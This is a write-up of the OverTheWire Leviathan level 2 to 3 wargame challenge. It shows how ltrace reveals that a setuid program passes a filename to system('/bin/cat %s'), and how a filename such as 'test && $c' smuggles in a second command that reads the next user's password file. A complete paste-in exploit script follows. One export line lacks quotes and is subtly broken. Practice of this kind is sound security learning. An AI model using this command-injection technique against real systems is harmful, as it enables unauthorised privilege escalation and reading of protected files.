# OTW - Leviathan #2 -> #3

Coming off of #1 -> #2 the method appears to be similar. Use the executable in the home folder to escalate access to the next numbered user and then print the password in `/etc/leviathan_pass`

To figure out how to escalate access is the trick. In the previous answer we used `hexdump` and found the password contained in the execeutable's .text section.

This time, .text is not useful. But we can use `ltrace` to see what function calls the program is making. First we create a temp folder to work in:


`mkdir /tmp/afw0839fh9aw8h3f0 && cd /tmp/afw0839fh9aw8h3f0`

Then we create a file to print:

`echo "test" > test`

Now we can run `ltrace`:

`ltrace ~/printfile /tmp/afw0839fh9aw8h3f0/test`

Output:

```
__libc_start_main(0x804852b, 2, 0xffffd704, 0x8048610 <unfinished ...>
access("test", 4)
snprintf("/bin/cat test", 511, "/bin/cat %s", "test")
geteuid()
geteuid()
setreuid(12002, 12002)
system("/bin/cat test"test
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )
+++ exited (status 0) +++
```

The interesting line is this: `system("/bin/cat test"test`

The script is making a system call that ammounts to `cat $filename`

We can exploit this by inserting a command into the filename so that it is run by the system call. First lets make our command to print the password:

`export c=cat /etc/leviathan_pass/leviathan3`

Now we will create a file with the command inside the name that will fit into the system call syntax:

`cp test 'test && $c'`

Now you can simply run this command to get the password:

`~/printfile 'test && $c'`

If we run an ltrace again we can see what is happening:

```
system("/bin/cat test && $c"test
```

Here is the complete answer (if you paste this into leviathan2 upon login you will receive the password:

```
randomString=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo '')
export p=/tmp/$randomString
mkdir $p && cd $p
touch c && echo "cat /etc/leviathan_pass/leviathan3" > c
chmod 777 c
export b=$p/c
cp c 'c && $b'
~/printfile 'c && $b'
```
